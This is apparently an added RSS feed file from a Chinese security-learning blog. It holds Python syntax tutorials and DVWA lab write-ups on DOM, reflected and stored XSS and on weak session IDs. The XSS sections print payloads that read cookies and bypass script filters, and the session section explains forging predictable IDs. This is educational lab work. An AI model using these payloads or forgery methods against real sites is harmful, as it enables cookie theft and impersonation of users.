@@ -1,0 +1,1061 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+	<channel>
+		<title>Basics on alee</title>
+		<link>https://www.a1ee.cn/basic/</link>
+		<description>Recent content in Basics on alee</description>
+		<generator>Hugo -- gohugo.io</generator>
+		<language>zh-cn</language>
+		<lastBuildDate>Mon, 28 Dec 2020 14:15:00 +0800</lastBuildDate>
+		<atom:link href="https://www.a1ee.cn/basic/index.xml" rel="self" type="application/rss+xml" />
+		
+		<item>
+			<title>Python_grammar_2</title>
+			<link>https://www.a1ee.cn/basic/python_grammar_2/</link>
+			<pubDate>Mon, 28 Dec 2020 14:15:00 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/basic/python_grammar_2/</guid>
+			<description>3.Python语法（二） 3.1.条件判断 Python程序语言指定任何非0和非空（null）值为true，0 或者 null为false。Pyt</description>
+			<content type="html"><![CDATA[<h1 id="3python语法二">3.Python语法（二）</h1>
+<h2 id="31条件判断">3.1.条件判断</h2>
+<p>Python程序语言指定任何非0和非空（null）值为true，0 或者 null为false。Python 编程中 if 语句用于控制程序的执行，基本形式为：</p>
+<pre><code>if 判断条件：
+    执行语句……
+else：
+    执行语句……
+</code></pre><p>if 语句的判断条件可以用&gt;（大于）、&lt;(小于)、==（等于）、&gt;=（大于等于）、&lt;=（小于等于）来表示其关系。当判断条件为多个值时，可以使用以下形式：</p>
+<pre><code>if 判断条件1:
+    执行语句1……
+elif 判断条件2:
+    执行语句2……
+elif 判断条件3:
+    执行语句3……
+else:
+    执行语句4……
+</code></pre><p>由于 python 并不支持 switch 语句，所以多个条件判断，只能用 elif 来实现，如果判断需要多个条件需同时判断时，可以使用 or （或），表示两个条件有一个成立时判断条件成功；使用 and （与）时，表示只有两个条件同时成立的情况下，判断条件才成功。
+示例：</p>
+<pre><code>num = 9
+if num &gt;= 0 and num &lt;= 5:
+	print('num belong [0,5]')
+elif num &gt;=5 and num &lt; 8:
+	print('num belong [5,7]')
+elif num &gt;=8 and num &lt;=10:
+	print('num belong [8,10]')
+else:
+	print('num &gt; 10')
+
+var = 10
+if num &lt; 5 or num &gt; 10:
+	print('var is not here')
+else:
+	print('var belong [5,10]')
+
+num +=var
+if (num &gt;=0 and num &lt;=10) or (num &gt;=15 and num &lt;=20):
+	print('num belong [0,10] or [15,20]')
+else:
+	print('num is not here')
+</code></pre><p>输出结果如下：</p>
+<pre><code>num belong [8,10]
+var belong [5,10]
+num belong [0,10] or [15,20]
+</code></pre><h2 id="32循环">3.2.循环</h2>
+<p>循环分为遍历循环（for）和条件循环（while）</p>
+<h3 id="321for-循环">3.2.1.for 循环</h3>
+<p>for循环的语法格式如下：</p>
+<pre><code>for iterating_var in sequence:
+   statements(s)
+</code></pre><p>通过索引遍历的示例：</p>
+<pre><code>fruits = ['banana', 'apple',  'mango']
+for index in range(len(fruits)):
+   print ('当前水果 :', fruits[index])
+</code></pre><p>输出如下：</p>
+<pre><code>当前水果 : banana
+当前水果 : apple
+当前水果 : mango
+</code></pre><p>以上示例使用了内置函数 len() 和 range(),函数 len() 返回列表的长度，即元素的个数。 range返回一个序列的数。</p>
+<h3 id="322while-循环">3.2.2.while 循环</h3>
+<p>while 语句用于循环执行程序，即在某条件下，循环执行某段程序，以处理需要重复处理的相同任务。其基本形式为：</p>
+<pre><code>while 判断条件(condition)：
+    执行语句(statements)……
+</code></pre><p>执行语句可以是单个语句或语句块。判断条件可以是任何表达式，任何非零、或非空（null）的值均为true。当判断条件假 false 时，循环结束。</p>
+<p>生成随机数示例：</p>
+<pre><code>import random
+random_numbers = []
+while len(random_numbers) &lt; 20:
+	random_numbers.append(random.randint(1,10))
+print(random_numbers, len(random_numbers))
+</code></pre><p>输出为：</p>
+<pre><code>2, 8, 5, 2, 8, 7, 5, 3, 4, 6, 4, 8, 8, 7, 8, 10, 10, 10, 5, 7] 20
+</code></pre><h3 id="323函数">3.2.3.函数</h3>
+<p>你可以定义一个由自己想要功能的函数，以下是简单的规则：</p>
+<ul>
+<li>函数代码块以 def 关键词开头，后接函数标识符名称和圆括号()。</li>
+<li>任何传入参数和自变量必须放在圆括号中间。圆括号之间可以用于定义参数。</li>
+<li>函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明。</li>
+<li>函数内容以冒号起始，并且缩进。</li>
+<li>return [表达式] 结束函数，选择性地返回一个值给调用方。不带表达式的return相当于返回 None。</li>
+</ul>
+<p>语法</p>
+<pre><code>def functionname( parameters ):
+   &quot;函数_文档字符串&quot;
+   function_suite
+   return [expression]
+</code></pre><p>在 python 中，strings, tuples, 和 numbers 是不可更改的对象，而 list,dict 等则是可以修改的对象。</p>
+<ul>
+<li>不可变类型：变量赋值 a=5 后再赋值 a=10，这里实际是新生成一个 int 值对象 10，再让 a 指向它，而 5 被丢弃，不是改变a的值，相当于新生成了a。</li>
+<li>可变类型：变量赋值 la=[1,2,3,4] 后再赋值 la[2]=5 则是将 list la 的第三个元素值更改，本身la没有动，只是其内部的一部分值被修改了。</li>
+</ul>
+<p>python 函数的参数传递：</p>
+<ul>
+<li>不可变类型：类似 c++ 的值传递，如 整数、字符串、元组。如fun（a），传递的只是a的值，没有影响a对象本身。比如在 fun（a）内部修改 a 的值，只是修改另一个复制的对象，不会影响 a 本身。</li>
+<li>可变类型：类似 c++ 的引用传递，如 列表，字典。如 fun（la），则是将 la 真正的传过去，修改后fun外部的la也会受影响</li>
+</ul>
+<p>python 中一切都是对象，严格意义我们不能说值传递还是引用传递，我们应该说传不可变对象和传可变对象。</p>
+]]></content>
+		</item>
+		
+		<item>
+			<title>Python_grammar_1</title>
+			<link>https://www.a1ee.cn/basic/python_grammar_1/</link>
+			<pubDate>Mon, 28 Dec 2020 14:14:56 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/basic/python_grammar_1/</guid>
+			<description>2.Python语法（一） 2.1 转义字符 \ 在 print 中想要输出单双引号，可以使用转义字符 \ 来进行输出，当然了也可以直接分开使用，因为单引号和双引号配套</description>
+			<content type="html"><![CDATA[<h1 id="2python语法一">2.Python语法（一）</h1>
+<h2 id="21-转义字符--">2.1 转义字符  \</h2>
+<p>在 <code>print</code> 中想要输出单双引号，可以使用转义字符 <code>\</code> 来进行输出，当然了也可以直接分开使用，因为单引号和双引号配套使用的时候，对另一个是没有影响的，所以可以直接输出，如下代码其实是等价的：</p>
+<pre><code>print(&quot;hello 'world'&quot;)
+print('hello \'world\'')
+print('hello &quot;world&quot;')
+print(&quot;hello \&quot;world\&quot;&quot;)
+</code></pre><h2 id="22-导入模块-import">2.2 导入模块 import</h2>
+<p><code>import</code> 的官方说明是：<code>python code in one module gains access to the code in another module by the process of importing it.</code>
+所以之前的彩蛋 <code>python之诗</code>，其实是导入了 <code>this</code> 模块，而这个模块的功能就是输出 <code>python之诗</code></p>
+<h2 id="23-输出函数-print">2.3 输出函数 print</h2>
+<p>在python中实现计算功能很方便，示例如下：</p>
+<pre><code>print(&quot;加法：1 + 2 = %d&quot; %(1+2))
+print(&quot;减法：3 - 2 = %d&quot; %(3-2))
+print(&quot;乘法：10 * 10 = %d&quot; %(10*10))
+print(&quot;除法：100 / 10 = %d&quot; %(100/10))
+print(&quot;求余数：10 %% 3 = %d&quot; %(10%3))
+print(&quot;幂运算：10 ** 3 = %d&quot; %(10**3))
+print(&quot;立方根运算：10 **(1/3) = %f&quot; %(10**(1/3)))
+import math
+print(&quot;Π = %f&quot; %(math.pi))
+</code></pre><h2 id="24-格式化字符串函数-format">2.4 格式化字符串函数 format</h2>
+<p>需要在一次输出的时候加入多个参数时，直接使用format会方便许多，示例如下：</p>
+<pre><code>print(&quot;我 是 {} ，\n爱 是 {} ，\n你 是 {} ，\n所以：‘{}’ 的意思是 ‘我爱你’&quot; .format(5,2,0,520))
+</code></pre><p><strong>注意：format 前面有一个 <code>·</code></strong></p>
+<h2 id="25-神奇的语法糖">2.5 神奇的语法糖</h2>
+<p><code>python</code> 中交换两个变量的值，可以直接采用语法糖的格式，非常的方便快捷：</p>
+<pre><code>a = 11010
+b = 10101
+print(&quot;a = {} , b = {} &quot; .format(a,b))
+print(&quot;语法糖开始&quot;)
+a, b = b, a
+print(&quot;a = {} , b = {} &quot; .format(a,b))
+
+</code></pre><h2 id="26-命名规范">2.6 命名规范</h2>
+<p>应该不会有人特意去用一些奇怪的名字，但还是记录以下：
+1、 标识符的第一个字符必须是字母表中的字母（大小写不限）或时一个下划线
+2、标识符名称的其他部分可有字母（大小写不限）、下划线、数字组成
+3、标识符名称大小写敏感</p>
+<h2 id="27-变量类型">2.7 变量类型</h2>
+<p><code>Python</code> 中，变量赋值时不需要类型说明，每个变量在内存中创建，都包括变量的标识、名称和数据这些信息，每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。</p>
+<p><code>Python</code> 定义了五种标准的类型，用于存储各种类型的数据：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">类型</th>
+<th style="text-align:center">标识符</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">数字</td>
+<td style="text-align:center">number</td>
+</tr>
+<tr>
+<td style="text-align:center">字符串</td>
+<td style="text-align:center">string</td>
+</tr>
+<tr>
+<td style="text-align:center">列表</td>
+<td style="text-align:center">list</td>
+</tr>
+<tr>
+<td style="text-align:center">元组</td>
+<td style="text-align:center">tuple</td>
+</tr>
+<tr>
+<td style="text-align:center">字典</td>
+<td style="text-align:center">dict</td>
+</tr>
+</tbody>
+</table>
+<h3 id="271python数字">2.7.1Python数字</h3>
+<p>Python支持四种不同的数字类型：</p>
+<ul>
+<li>int（有符号整型）</li>
+<li>long（长整型[也可以代表八进制和十六进制]）</li>
+<li>float（浮点型）</li>
+<li>complex（复数）</li>
+</ul>
+<h3 id="272python字符串">2.7.2Python字符串</h3>
+<p>字符串或串(String)是由数字、字母、下划线组成的一串字符。</p>
+<pre><code>s=&quot;a1a2···an&quot;(n&gt;=0)
+</code></pre><p>它是编程语言中表示文本的数据类型。python的字串列表有2种取值顺序:</p>
+<pre><code>示例字符串：s = &quot;string&quot;
+</code></pre><ul>
+<li>从左到右索引默认0开始的，最大范围是字符串长度少1</li>
+<li>从右到左索引默认-1开始的，最大范围是字符串开头</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">s</th>
+<th style="text-align:left">t</th>
+<th style="text-align:left">r</th>
+<th style="text-align:left">i</th>
+<th style="text-align:left">n</th>
+<th style="text-align:left">g</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">0</td>
+<td style="text-align:left">1</td>
+<td style="text-align:left">2</td>
+<td style="text-align:left">3</td>
+<td style="text-align:left">4</td>
+<td style="text-align:left">5</td>
+</tr>
+<tr>
+<td style="text-align:left">-6</td>
+<td style="text-align:left">-5</td>
+<td style="text-align:left">-4</td>
+<td style="text-align:left">-3</td>
+<td style="text-align:left">-2</td>
+<td style="text-align:left">-1</td>
+</tr>
+</tbody>
+</table>
+<p>如果你要实现从字符串中获取一段子字符串的话，可以使用 [头下标:尾下标] 来截取相应的字符串，其中下标是从 0 开始算起，可以是正数或负数，下标可以为空表示取到头或尾。[头下标:尾下标] 获取的子字符串包含头下标的字符，但不包含尾下标的字符。
+示例代码：</p>
+<pre><code>s = &quot;string&quot;
+print (s)
+print (s[0:2])
+print (s[-6:-4])
+print (s[2:-1])
+</code></pre><p>运行结果：</p>
+<pre><code>string
+st
+st
+rin
+</code></pre><h3 id="273python列表">2.7.3Python列表</h3>
+<p>列表可以完成大多数集合类的数据结构实现。它支持字符，数字，字符串甚至可以包含列表（即嵌套）。列表用 [ ] 标识，是 python 最通用的复合数据类型。列表中值的切割也可以用到变量 [头下标:尾下标] ，就可以截取相应的列表，从左到右索引默认 0 开始，从右到左索引默认 -1 开始，下标可以为空表示取到头或尾。（示例：t = [&lsquo;a&rsquo;,&lsquo;b&rsquo;,&lsquo;c&rsquo;,&rsquo;d',&lsquo;e&rsquo;]）</p>
+<table>
+<thead>
+<tr>
+<th>t = 【</th>
+<th>&lsquo;a&rsquo;</th>
+<th>&lsquo;b&rsquo;</th>
+<th>&lsquo;c&rsquo;</th>
+<th>&rsquo;d'</th>
+<th>&lsquo;e&rsquo;</th>
+<th>】</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td>0</td>
+<td>1</td>
+<td>2</td>
+<td>3</td>
+<td>4</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>-5</td>
+<td>-4</td>
+<td>-3</td>
+<td>-2</td>
+<td>-1</td>
+<td></td>
+</tr>
+<tr>
+<td>t = [1:3]</td>
+<td></td>
+<td>=</td>
+<td>=</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>t = [3:]</td>
+<td></td>
+<td></td>
+<td></td>
+<td>=</td>
+<td>=</td>
+<td></td>
+</tr>
+<tr>
+<td>t = [:-2]</td>
+<td>=</td>
+<td>=</td>
+<td>=</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>示例代码：</p>
+<pre><code>demo_list = ['tom','100','john','10']
+print (demo_list)
+print (demo_list[0:2])
+print (demo_list[-4:-2])
+print (demo_list[:-1])
+</code></pre><p>输出结果：</p>
+<pre><code>['tom', '100', 'john', '10']
+['tom', '100']
+['tom', '100']
+['tom', '100', 'john']
+</code></pre><h3 id="274python元组">2.7.4Python元组</h3>
+<p>元组是另一个数据类型，类似于 List（列表）。元组用 <code>()</code> 标识。内部元素用逗号隔开。但是元组不能二次赋值，相当于只读列表。
+示例代码：</p>
+<pre><code>demo_list = ['tom','100','john','10']
+demo_tuple = ('tom','100','john','10')
+demo_list[2] = 10
+print (demo_list)
+demo_tuple[2] = 1000
+print (demo_tuple)
+</code></pre><p>会出现如下报错：</p>
+<pre><code>['tom', '100', 10, '10']Traceback (most recent call last):
+  File &quot;D:\学习记录\Python\Demo.py&quot;, line 5, in &lt;module&gt;
+
+    demo_tuple[2] = 1000
+TypeError: 'tuple' object does not support item assignment
+</code></pre><h3 id="275python字典">2.7.5Python字典</h3>
+<p>字典(dictionary)是除列表以外python之中最灵活的内置数据结构类型。列表是有序的对象集合，字典是无序的对象集合。两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。字典用&quot;{ }&ldquo;标识。字典由索引(key)和它对应的值value组成。
+示例如下：</p>
+<pre><code>demo_dict = {}
+demo_dict['demo'] = &quot;this is demo&quot;
+demo_dict[1] = &quot;this is one&quot;
+test_dict = {2:'this is two','year':2020}
+print(demo_dict[1])
+print(test_dict)
+print(test_dict.keys())
+print(demo_dict.values())
+</code></pre><p>输出如下：</p>
+<pre><code>this is one
+{2: 'this is two', 'year': 2020}
+dict_keys([2, 'year'])
+dict_values(['this is demo', 'this is one'])
+</code></pre>]]></content>
+		</item>
+		
+		<item>
+			<title>Python_info</title>
+			<link>https://www.a1ee.cn/basic/python_info/</link>
+			<pubDate>Mon, 28 Dec 2020 14:11:37 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/basic/python_info/</guid>
+			<description>1. Python简介 1.1 Python环境搭建 在python官方网站下载 python环境（推荐使用3.x版本），python2 已经在2020年停止</description>
+			<content type="html"><![CDATA[<h1 id="1-python简介">1. Python简介</h1>
+<h2 id="11-python环境搭建">1.1 Python环境搭建</h2>
+<p>在<a href="https://www.python.org/">python官方网站</a>下载 <code>python</code>环境（推荐使用3.x版本），<code>python2</code> 已经在2020年停止更新了！
+无论是下载zip包还是安装包，都需要配置环境变量，（本机的 <code>python</code>安装地址为：<code>C:\Program Files\Python38\python.exe</code>）配置过程如下：</p>
+<p>配置环境变量：打开 <code>此电脑 &gt; 属性 &gt; 高级系统设置 &gt; 环境变量 &gt; 系统变量 path &gt; 新建</code></p>
+<p><img src="/_v_images/20200109104736092_25962.png" alt="配置如下"></p>
+<h2 id="12-sublime开发环境配置">1.2 sublime开发环境配置</h2>
+<p>接下来配置 <code>sublime</code>开发环境：依次点击：<code>Tools &gt; Build System &gt; New Build System</code></p>
+<p><img src="/_v_images/20200109105115596_15915.png" alt="配置sublime"></p>
+<p>会打开一个新的页面，将内容：</p>
+<pre><code>{
+	&quot;shell_cmd&quot;: &quot;make&quot;
+}
+</code></pre><p>修改为：</p>
+<pre><code>{
+    &quot;cmd&quot;: [&quot;C:/Program Files/Python38/python.exe&quot;,&quot;-u&quot;,&quot;$file&quot;],
+    &quot;file_regex&quot;: &quot;^[ ]*File \&quot;(...*?)\&quot;, line ([0-9]*)&quot;,
+    &quot;selector&quot;: &quot;source.python&quot;,
+    &quot;encoding&quot;:&quot;cp936&quot;,
+}
+</code></pre><p><code>C:/Program Files/Python38/python.exe</code> 这个是本机的 <code>python</code>路径，替换成你的 <code>python</code>安装路径。然后修改文件名（本机修改为 <code>Python38</code>）保存在默认路径下，如想找到该文件，路径应当为：<code>C:\Users\alee\AppData\Roaming\Sublime Text 3\Packages\User</code>（其中 <code>alee</code>为当前计算机用户名）</p>
+<p>在 <code>sublime</code>中选择运行环境：<code>Tools &gt; Build System &gt; Python38</code></p>
+<p><img src="/_v_images/20200109105954335_6543.png" alt="选择开发环境"></p>
+<p>测试 <code>Demo.py</code>，代码为 <code>print(&quot;hello world&quot;)</code>，但出现如下报错：</p>
+<p><img src="/_v_images/20200109110056463_16280.png" alt="测试"></p>
+<p>原因在于未保存文件到本地，所以 <code>python</code>环境无法解释代码，保存后即可：</p>
+<p><img src="/_v_images/20200109110317785_10571.png" alt="成功运行"></p>
+<p>彩蛋 <code>python之诗</code>：</p>
+<p><img src="/_v_images/20200109112259426_10303.png" alt="python之诗"></p>
+]]></content>
+		</item>
+		
+		<item>
+			<title>Dvwa_xss</title>
+			<link>https://www.a1ee.cn/basic/dvwa_xss/</link>
+			<pubDate>Mon, 28 Dec 2020 13:46:53 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/basic/dvwa_xss/</guid>
+			<description>DVWA_Xss（跨站脚本攻击） 前言 这是一个简单又复杂的话题，简单是因为它的利用方式异常简单：插入一条引用外部js的代码即可；复杂是因为想要</description>
+			<content type="html"><![CDATA[<h1 id="dvwa_xss跨站脚本攻击">DVWA_Xss（跨站脚本攻击）</h1>
+<h2 id="前言">前言</h2>
+<p>这是一个简单又复杂的话题，简单是因为它的利用方式异常简单：插入一条引用外部js的代码即可；复杂是因为想要理解其原理需要了解的东西，有点多。</p>
+<p>首先要了解浏览器输入网页后，到网页完全展示在浏览器中，都发生了什么。</p>
+<p>这一步最难理解的是<code>DOM</code>，什么是<code>DOM</code>？详细的你可以自行百度（建议绕开无聊的抄袭博客，直接从原理出发，关键字加上<code>知乎</code>，更容易找到目标）。我的总结是这是一个树形结构，什么是<code>树形结构</code>？我对<code>结构</code>的理解，就是一种方便理解的图例。</p>
+<p>树的特性，就是只有一个出发点，然后生出许多的枝干，枝干又生出许多的分叉，分叉上又生出许多的叶子。</p>
+<p>把每一个岔口当作是一个分类，就可以把一个复杂的东西，逐渐细化，再细化，直到可以理解为止，这一点可以参考脑图的树状结构，把每一个细化到不能细化的<code>叶子</code>，拼接在一起，就可以理解这个庞大复杂的东西了。</p>
+<p><code>DOM</code>就是用来干这个的，接收到代码数据时，浏览器会通过<code>解析器</code>解析代码构造<code>DOM结构树</code>。</p>
+<p><strong>这里说明一下<code>解析器</code>，首先我没有仔细的查过相关文档，其次下面写的说明，纯粹是我自己的理解，请怀着质疑的态度审阅！</strong></p>
+<p><code>解析器</code>也可以理解成<code>解释器</code>，顾名思义，就是解释开发语言的一种东西，解释语言，就需要遵循语法，所以不同的语法，对应的解释器是不一样的，类比：英语、汉语、日语、等等语言，如果不是懂语法结构，虽然都是人发出来的声音，但却是听不懂的，虽然我们小时候学习说话时莫名其妙就学会了这东西，但理解说话意思的，还是基于语法结构的解释。例如：<code>学习使我快乐</code>，能理解这句话，是因为明白每个组成的部分的意思：“学习”“使”“我”“快乐”，开发语言也是一样，例如：</p>
+<pre><code>&lt;html&gt;
+ &lt;head&gt;
+  &lt;title&gt;文档标题&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+  &lt;a href='www.a1ee.cn'&gt;我的链接&lt;/a&gt;
+  &lt;h1&gt;我的标题&lt;/h1&gt;
+ &lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>这是一个简单的html代码，用浏览器打开将是一个只有title显示的空白页面，基于html的语法结构，解析器对代码进行解析，然后形成<code>DOM结构</code>，最终在浏览器中加载出<code>DOM结构</code>，形成了我们看到的页面样式，<code>DOM结构</code>示例图如下：</p>
+<p><img src="/_v_images/20201012102437512_5203.png" alt=""></p>
+<p>html是一种开发语言，javascript也是，php、asp等等都是，只要遵循语法结构，用解释器去解释其代码的含义，就能让程序员写的代码按照当初的设计意志进行展示，但是<code>解析器</code>不是开发代码的程序员，并不知道当初设计的意志，所以只会按照语法结构，对代码从上往下，从左到右的进行解释（为什么会是这个顺序呢？要从根源讲起的话，就要说cpu的处理机制了，这显然更加复杂，就简单‘误解’成约定熟成吧）。这其实也就是<code>XSS</code>漏洞形成的根本原因，因为<code>解析器</code>是按照语法结构逐步解析代码的，当我们按照语法结构，将代码插入到了代码数据的报文中时，浏览器就会按照语法结构，将报文信息解析成<code>DOM结构</code>，然后开始前端展示。</p>
+<p><strong>当然了，整个过程肯定是非常复杂的，不可能这样三言两语说的清楚，我也不知道读者是否可以理解，不过不用着急，慢慢就会理解了</strong></p>
+<h2 id="差异">差异</h2>
+<p><strong>xss分为三种类型：反射型、存储型、dom型</strong></p>
+<p>其实三者并非完全独立的类型，通常情况下是将利用方式，分为了反射型和存储型，由于作用域不同，独立了一个dom型出来。</p>
+<ul>
+<li>dom型：作用于dom结构的攻击方式；</li>
+<li>反射型：通过url直接控制页面输出的攻击方式；</li>
+<li>存储型：存入数据库，再取出来达到控制页面的攻击方式。</li>
+</ul>
+<p><strong>仔细观察可以发现，其实dom型与反射型和存储型是相互包容的；反射型与存储型的差异是攻击方式。</strong></p>
+<h2 id="测试方法和实际利用">测试方法和实际利用</h2>
+<p>xss的测试方法，常见的是使用弹窗测试，但有一些开发人员，对弹窗函数进行了过滤，这其实是一种治标不治本的方法，因为xss的实际利用，往往是通过引用外部js文件来进行更多操作的，所以过滤弹窗，其实并不能起到很好的防御作用。</p>
+<h2 id="dom型xss">dom型xss</h2>
+<h3 id="low">LOW</h3>
+<p>使用最常见的测试payload：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+<p><img src="/_v_images/20201012145603869_7828.png" alt=""></p>
+<p>因为该级并未进行任何防护，所以直接弹窗是意料之中的。</p>
+<h3 id="medium">Medium</h3>
+<p><img src="/_v_images/20201012154055503_24494.png" alt=""></p>
+<p>过滤了<code>&lt;script</code>，但是还有很多可以用来进行测试的payload，例如：<code>&lt;a/href=javascript&amp;colon;alert(document.cookie)&gt;click</code>（该payload需要点击click才能触发）</p>
+<p>直接在url尾部添加payload，并不会正常的将代码插到可被正常解析的地方，反而是在<code>English</code>后面直接添加上了<code>click</code>：</p>
+<pre><code>&lt;option value=&quot;English%3Ca/href=javascript:alert(document.cookie)%3Eclick&quot;&gt;Englishclick&lt;/option&gt;
+</code></pre><p>根据代码前后关系，可闭合标签进行尝试，首先闭合<code>option</code>标签：</p>
+<pre><code>&lt;option value=&quot;English%3C/option%3E%3Ca/href=javascript:alert(document.cookie)%3Eclick&quot;&gt;English&lt;/option&gt;
+</code></pre><p>闭合代码被直接插入到了<code>English</code>后方，可是依旧没有正常解析，于是再向上闭合一个标签，发现可以被解析了，最终payload：<code>&lt;/option&gt;&lt;/select&gt;&lt;a/href=javascript&amp;colon;alert(document.cookie)&gt;click</code></p>
+<p>浏览器解析及触发结果如下：</p>
+<p><img src="/_v_images/20201012155803851_14535.png" alt=""></p>
+<h3 id="high">High</h3>
+<p><img src="/_v_images/20201012161206042_32176.png" alt=""></p>
+<p>从源码上看，对参数进行了校验，但是还是有一种方式可以绕过：<code>#&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p><img src="/_v_images/20201012172728622_28854.png" alt=""></p>
+<p>实际插入代码如下：</p>
+<pre><code>&lt;option value=&quot;English#%3Cscript%3Ealert(1)%3C/script%3E&quot;&gt;English#&lt;script&gt;alert(1)&lt;/script&gt;&lt;/option&gt;
+</code></pre><h3 id="impossible">Impossible</h3>
+<p>查看源码，前端代码并未做限制，但直接插入并没有正常弹窗，前端显示反而出现了编码字符，所以是后端进行了编码：</p>
+<p><img src="/_v_images/20201012173115486_61.png" alt=""></p>
+<p><strong>注：其实这个实验已经说明了目前关于xss的主要防护方式：黑名单过滤、白名单过滤、编码显示。其中黑白名单都存在被绕过的可能，编码方式是最为安全的防护方式，但世事无绝对，一些弱编码，还是存在被绕过的可能。</strong></p>
+<blockquote>
+<p>由于上面已经很清楚的说明了各种原理性问题，后续两种xss将仅记录绕过方式。</p>
+</blockquote>
+<h2 id="反射型xss">反射型xss</h2>
+<h3 id="low-1">LOW</h3>
+<p>直接输入测试payload出现弹窗：'<!-- raw HTML omitted -->alert(document.cookie)<!-- raw HTML omitted -->'</p>
+<p><img src="/_v_images/20201012182022567_20638.png" alt=""></p>
+<h3 id="medium-1">Medium</h3>
+<p>一样是过滤了<code>&lt;script&gt;</code>，采用不包含的测试payload即可：<code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code></p>
+<p><img src="/_v_images/20201012182541967_2378.png" alt=""></p>
+<h3 id="high-1">High</h3>
+<p>过滤规则是要强一点的，但依然是没有完全的进行过滤</p>
+<p><img src="/_v_images/20201012182622407_10763.png" alt=""></p>
+<p>由于过滤不严格，使用上一个payload可以直接绕过：<code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code></p>
+<p><img src="/_v_images/20201012182603159_31125.png" alt=""></p>
+<h3 id="impossible-1">Impossible</h3>
+<p><img src="/_v_images/20201015164017943_4119.png" alt=""></p>
+<p>前端代码的过滤方式是直接使用htmlspecialchars函数进行转码。</p>
+<p><img src="/_v_images/20201015165339734_24794.png" alt=""></p>
+<p>这种直接转为html实体是最为安全的做法。</p>
+<h2 id="存储型xss">存储型xss</h2>
+<h3 id="low-2">LOW</h3>
+<p>直接输入，发现存在长度限制，审查元素，修改长度为100，即可继续输入payload：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+<p><img src="/_v_images/20201015172105413_3921.png" alt=""></p>
+<p><img src="/_v_images/20201015172222268_23289.png" alt=""></p>
+<h3 id="medium-2">Medium</h3>
+<p><img src="/_v_images/20201015172712933_24328.png" alt=""></p>
+<p>查看源码得知过滤了<code>&lt;script&gt;</code></p>
+<p>还是同样的payload：<code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code></p>
+<p><img src="/_v_images/20201015172810028_6452.png" alt=""></p>
+<h3 id="high-2">High</h3>
+<p><img src="/_v_images/20201015173449372_26593.png" alt=""></p>
+<p>可能是为了演示吧，过滤都是一样的，那结果自然也是一样的。</p>
+<p><img src="/_v_images/20201015173001996_25944.png" alt=""></p>
+<h3 id="impossible-2">Impossible</h3>
+<p>同样是htmlspecialchars函数转码。</p>
+<p><img src="/_v_images/20201015173623837_26265.png" alt=""></p>
+]]></content>
+		</item>
+		
+		<item>
+			<title>Dvwa_weak_session_ids</title>
+			<link>https://www.a1ee.cn/basic/dvwa_weak_session_ids/</link>
+			<pubDate>Mon, 28 Dec 2020 13:43:06 +0800</pubDate>
+			
+			<guid>https://www.a1ee.cn/basic/dvwa_weak_session_ids/</guid>
+			<description>DVWA_Weak_Session_IDs（会话id伪造） 这个常见于越权（未授权）访问，身份伪造等。一些权限校验不严谨，读取cookie中的</description>
+			<content type="html"><![CDATA[<h1 id="dvwa_weak_session_ids会话id伪造">DVWA_Weak_Session_IDs（会话id伪造）</h1>
+<p>这个常见于越权（未授权）访问，身份伪造等。一些权限校验不严谨，读取<code>cookie中</code>的<code>sissionid</code>，来鉴别用户所属权限组，就可以伪造<code>sessionid</code>，进行越权（未授权）访问。有一些日志会记录当前操作对象，读取<code>id</code>号来录入数据库，这样伪造<code>id</code>号，就可以对当前操作人员的身份进行伪造。这个实验不突出于应用，而是对生成规则的探究，这一点在实际运用过程中才是尤为重要的，猜解<code>cookie</code>的生成规则，就相当于掌握了身份伪造的方法。</p>
+<h2 id="low">LOW</h2>
+<p>抓包查看规律：</p>
+<p><img src="/_v_images/20200910093630354_10679.png" alt=""></p>
+<p>没发送一次，<code>id</code>号递增一次，很简单的生成规则，伪造起来也很简单。</p>
+<h2 id="medium">MEDIUM</h2>
+<p>一样的观察特征：</p>
+<p><img src="/_v_images/20200910094011090_32751.png" alt=""></p>
+<p>这种长度，这样的开头数字，很容易联想到unix时间戳。这种方式也很容易伪造，不过，我觉得这种场景，应该只能应用于<code>cookie</code>有效期校验吧……</p>
+<h2 id="high">HIGH</h2>
+<p>观察特征：</p>
+<p><img src="/_v_images/20200910094727695_32637.png" alt=""></p>
+<p>这种特征，应该是<code>md5</code>，放到<code>cmd5</code>中检查一下，是还能跑出结果。</p>
+<p>其实到这一步，对普通人来说已经比较安全了，由于<code>md5</code>的不可逆性，这里只能采用彩虹表来进行查找，但是对于高端玩家来说，还是很不够看的，毕竟<code>cmd5</code>的会员，还是能查出太多太多东西了。由于这里采用的是纯数字的<code>md5</code>，就几乎没有防御性可言了，大概只有看起来好看的作用吧。</p>
+<h2 id="impossible">IMPOSSIBLE</h2>
+<p>直接查看源码：</p>
+<p><img src="/_v_images/20200910100017871_1634.png" alt=""></p>
+<p>用了<code>sha1</code>散列，对象是“随机数+时间+字符串”，这样想要依靠猜解，构造出可用的cookie，还是很靠运气的，不如直接策反开发。</p>
+]]></content>
+		</item>
+		
+		<item>
+			<title>Dvwa_file_upload</title>
